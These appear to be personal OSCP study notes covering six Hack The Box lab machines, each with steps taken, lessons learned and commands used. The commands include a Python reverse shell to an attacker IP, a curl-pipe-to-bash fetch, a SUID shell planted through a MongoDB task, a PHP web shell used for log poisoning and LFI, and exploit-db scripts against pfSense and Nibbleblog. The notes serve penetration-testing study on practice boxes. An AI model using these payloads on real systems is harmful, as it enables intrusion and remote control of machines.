# OSCP Preparation Boxes

``` 
FORMAT

### Approach Taken

### Lessons Learned

### Commands Used

```

## 1. Bashed

### Approach Taken
- nmap scan is run with default scripts along with version enumeration.
- Once you discover the web application on the specified port you will try to find out which version of operating system that is.
- Then running gobuster will reveal specific uris like /php & /dev which will expose sendmail & webshells
- Once getting the web shell we upload the LinEnum.sh to discover that the user can run anything as `scriptmanager` user.
- the scriptmanager user has a script which is executed by the root as a cron, we will try to leverage that cronjob by place our pentest monkey scripts to get a root shell

### Lessons Learned
- This is the very first box that we did on HTB. Ippsec showed how you need to document your findings as you try to solve the box
- Enumeration is a very important step.
- The way we should use cherrytree to document findings is the important lesson learned here 

### Commands Used
```
nmap -sC -sV -oA nmap_bashed 10.10.10.68

gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.25",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## 2. Nibbles

### Approach Taken
- nmap scan is run with default scripts along with version enumeration
- gobuster is run but nothing is revealed
- Hence we try to intercept the request with burp, & when we look at the server response we get pointed out to a specific uri path which is /nibbleblog
- When we explore that we get the software used which is nibbleblog
- we will download a version of nibbleblog from the internet, and we will explode in a local directory
- we will try to query the version within this exploded path & find the file which exposes that version
- we will then try to navigate the same uri path on the web application
- with this the version information is also exposed.
- the next step is to find out what vulnerabilities can be found with the app & its version being known
- we simply use searchsploit & find out the vulns
- we can simply execute the script or do the same with metasploit, this is the easy way of getting a shell on the box
- once you will get a shell you will list the sudo privs and find out that a specific script can be executed as root, you will modify this script to get a root escalation and a root shell

### Lessons Learned
- If gobuster goes south, you will need to find out what is the web application software running
- Once the software running is known, we will try to find out which version of web app is running
- You can download a copy from internet & find files where the version information is exposed, we can try to use that info/file detail with the app/box that we want to compromise
- once the version & app info is known, use searchsploit or cve details to find out exploits or vulnerabilities.
- the go for further enumeration to privilege escalate yourselves

### Commands Used
```
nmap -sC -sV -oA nmap_nibbles 10.10.10.75

gobuster dir -u http://10.10.10.75 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

searchsploit nibbleblog 4.0.3

searchsploit -m php/remote/38489.rb
```

## 3. Sense

### Approach Taken
- After running nmap & gobuster you will find users who can use weak credentials
- Once you login you will find the app being used & its version
- You will find the CVE details & vulns (command injection here is the key vuln)
- You will leverage command injection with the help of burp repeater & will try to get a shell on the system
- Once the shell is obtained, you are already root so nothing further to be done

### Lessons Learned
- Running burp is heavily acquianted here especially using repeater
- Use gobuster to expose different types of file extensions and they can be a critical vector to spot authentication related information
- What if your are banned or locked out, you can use different techniques like `ssh -D` or proxy chains or burp proxying this is a very useful technique
- played with nc in different ways where you can submit a bunch of code by using `nmap -lnvp <lport> < pentest_pyth_script.txt` & when you do `nc <attack-host> <lport> | python` you will get passed the pentest_pyth_script.txt and you can get a reverse shell by setting up another listener on attack box, this technique is amazing whenever passing the code around with command injection becomes difficult.

### Commands Used
```
nmap -sC -sV -oA nmap_sense 10.10.10.60

gobuster dir -t 64 -k -u https://10.10.10.60 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt

searchsploit pfsense 2.1.3

searchsploit -m php/webapps/43560.py

./43560.py --rhost 10.10.10.60 --lhost 10.10.14.25 --lport 4444 --username rohit --password pfsense

``` 

## 4. Node

### Approach Taken
- run the nmap scan & access the web application
- run gobuster
- gobuster is not helpful moving on
- with burp, spider the host & find out the app.js which will result in finding the required pages. we will navigate to each and every page.
- we have /api/users which reveals some key user information.
- we will have got hashes, try it out on hashes.com & find out the passwords. Try the admin account on the login page.
- download the backup, base64 decode it & you will find a .zip file with password protection, you can use fcrackzip
- You will have sourcecode for the application, search for 'password'
- app.js has mongo credentials. Try to ssh with the same credentials. As soon as you get on the box, run the LinEnum.sh
- always check for kernel exploits (priv escalation) & observe the processes run by tom, he is running scheduler.js script
- using scheduler.js, escalate yourself to tom user & run LinEnum.sh again
- search for SUID files
- apply group ownership related files
- get the backup file and do binary exploitation or buffer overflow exploitation

### Lessons Learned
- Running gobuster through a proxy. In order to do that, go to burpsuite -> proxy -> options -> Add Proxy Listener (Binding: Specify Listen Port (8081), Request handling: Redirect to host: 10.10.10.58;Redirect to port: 3000)
- There may be filtering in place for requests in order to prevent gobuster from doing enumeration, this can be identified by a difference in user-agent header. You can infact change the header with a flag
- [hashes.org](https://hashes.org) is a useful for cracking hashes

### Commands Used
```
nmap -T5 -n -vvv -oA nmap/initial_no_scripts 10.10.10.58

nmap -sC -sV -p22,3000 -oA nmap/initial 10.10.10.58

nmap -p- -n -vvv -oA nmap/allports 10.10.10.58

gobuster -u http://10.10.10.58:3000 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

# gobuster through burp proxy
gobuster -u http://127.0.0.1:8081 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

gobuster -u http://127.0.0.1:8081 -a 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0' -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

sed 's/,/\n/g' api/users/<file>

fcrackzip -D -p /usr/share/wordlists/rockyou.txt backup.zip

curl http://10.10.14.25:8000/LinEnum.sh | bash

mongo -p -u mark scheduler

db.tasks.insert({"cmd": "cp /bin/dash /tmp/bluejay; chmod u+s /tmp/bluejay;" })

db.tasks.find()

/tmp/bluejay820 -p

find / -perm -4000 2>/dev/null

# after getting your shell as tom, run LinEnum.sh again


# transfer the backup file to your attack box
nc 10.10.14.25 8082 < backup
nc -lnvp 8082 > backup
md5sum backup

# run strace
strace backup

# analyze the assembly
r2 backup
aaa # analyze
afl # print the function list
vvv # to enter the visualization mode
## scroll down to the point where the function call is sym.main
## hit gg (a couple of times and space to change the view to get the viz
## you get a flow graph (function view)
## try to depict how the binary is executed interms of arguments and try to strace the command to find the system calls

# compile time protections
gdb backup 
checksec
del 1 # delete all break points
b 1 # set a breakpoint for main
r # run the program
jmpcall

```

## 5. Valentine

### Approach Taken
- run the nmap scan 
- run the nmap vuln scan
- do the gobuster
- exploit the heart bleed vuln with `python github heartbleed` script
- heartbleed will reveal the passphrase
- gobuster will reveal the key
- SSH into the server and there by run the LinEnum.sh as always
- connect to the tmux -S <socket-name>

### Lessons Learnt
- always observe the versions being printed out
- whenever a webserver is installed depending on the version you may predict the version of the underlying operating system
- search like this `apache 2.2.22 ubuntu` & look for launchpad links which will point you to the distro that particular package was uploaded to.
- Once you know the distro name search again like this `ubuntu releases <distro-name>`, or for example `ubuntu releases precise`
- there are LTS releases, future releases and end of life releases
- when the operating system is too old or end of life, there is a great chance of vulns
- A app called `sslyze` which is an ssl scanner
- xkcd is a comic about explaining the difficult concepts
- run the heartbleed and see what you can find from the memory
- You need to find about the root processes which are root running in that way, if there is some file/socket which as a user/group have access you can try to exploit it
- If you are copying stuff off of internet into some editors, use `:set paste`

### Commands used
```
nmap -sC -sV -oA nmap/valentine 10.10.10.79
nmap --script vuln -oA nmap/vulnscan 10.10.10.79
sslyze --heartbleed 10.10.10.79:443
xkcd heartbleed
python3 heartbleed.py -n 100 10.10.10.79
tmux -S <socket-name>
```

## 6. Poison

### Approach Taken
- run nmap scan differently this time by applying xsl stylesheet
- examine the website & invoke various .php scripts
- look if the phpinfo.php has file uploads turned on.
- then burp the browse.php file & try to exfiltratre `ini.php` file
- if you observe, browse.php has a Local File Inclusion Vulnerability
- with that we want to check if has RFI as well. so, you host a webserver and have an PentestMonkey PHP reverse shell get Remote File included.`/browse.php?file=http://10.10.10.14/Anyfile` or check `/browse.php?file=ftp://10.10.10.14/Anyfile` or check `/browse.php?file=expect://ls` (code execution)
- but we have found out that RFI cannot be done, but LFI can be done
- You can do a `/browse.php?file=/etc/passwd` & the passwordfile already found, you could find the user and get an SSH but let us explore the LFI properly
- search a `phpinfo lfi` & try out in burp how such lfi.py will work & how you can check the LFI on behalf of phpinfo.php is being exploited
```
Content-Type: multipart/form-data; boundary=--PleaseSubscribe
Content-Length: 0

--PleaseSubscribe
Content-Disposition: form-data; name="anything"; filename="LeaveAComment"
Content-Type: text/plain

Please share my videos

--PleaseSubscribe
```
- `python phplfi.py 10.10.10.84 80 100`
- get the shell & go to apache directory
- decode the user password & do an ssh
- run linuxenum.sh & privilege escalate to root if you want
- the log poison attack is to change the Agent to php-code (find in command used)

### Lessons Learnt
- LFI -> Local File Inclusion -> Include a file on the webserver and have your webserver execute it.
- RFI -> Remote File Inclusion -> Have a PHP file or an executable file on your attack box and let the webserver load/execute it.
- LFI way 1 -> Log Poisoning
- `nmap xsl bootstrap` -> xsl stands for XML style sheet, run the command and open the `poison.xml` in a web browser
- **Exfiltration of PHP code** - to convert files into base64 using php filter try this - `/browse.php?file=php://filter/convert.base64-encode/resource=index.php` - the catch here is if its going to get converted to base64 apache is not going read `<?php ?>` tags and therefore the invoked .php scripts doesn't get executed. And thus its a great way to exfiltrate php source code using this method. 
- For RFI to work, in the PHP configuration you must have `allow_url_include` by be set in the configuration
- Changing the type type of request to POST
- Payload all the things  - download it!!
- Log Poisioning is to be able to view the log file from the web & posion it by changing the Agent
- konami ssh code - SANS blog
- search for vnc password decrypt github


### Commands used
```
nmap -sC -sV -oA poison --stylesheet nmap-bootstrap.xsl 10.10.10.84

firefox poison.xml

<?php echo 'Please Subscribe' ?>
<?php system($\_REQUEST['ippsec']);?>

/browse.php?file=/var/log/httpd-access.log?ippsec=uname-a

# root listing of processess
ps auxww | grep root

# proxy traffic through ssh via 1080 port & open up 6801 for 5801 on the target box
ssh -D 1080 -L6801:127.0.0.1:5801 -L6901:127.0.0.1:6901 charix@10.10.10.84

vncviewer 127.0.0.1::6901

```
